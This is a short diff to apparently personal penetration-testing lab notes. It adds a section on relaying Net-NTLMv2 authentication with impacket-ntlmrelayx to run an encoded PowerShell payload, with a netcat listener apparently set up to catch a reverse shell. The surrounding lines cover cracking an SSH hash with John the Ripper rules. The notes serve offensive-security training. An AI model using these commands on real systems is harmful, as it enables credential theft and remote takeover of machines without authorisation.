@@ -150,3 +150,12 @@ c $1 $3 $7 $#
 sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf' (add a name for the rules and append them to the /etc/john/john.conf)
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 ```
+### Relaying Net-NTLMv2(when Net-NTLMv2 is too complex to crack)
+> This is used when the user in files01 is an unprivileged user but is an local administrator account on files02
+
+> Windows UAC will restrict any user accounts behaviour remotely other than the local administrator
+```
+kali: impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...(UTF-16LE base64 encoded payload)"
+kali: nc -nvlp 8080
+files01: dir \\192.168.119.2\test
+```
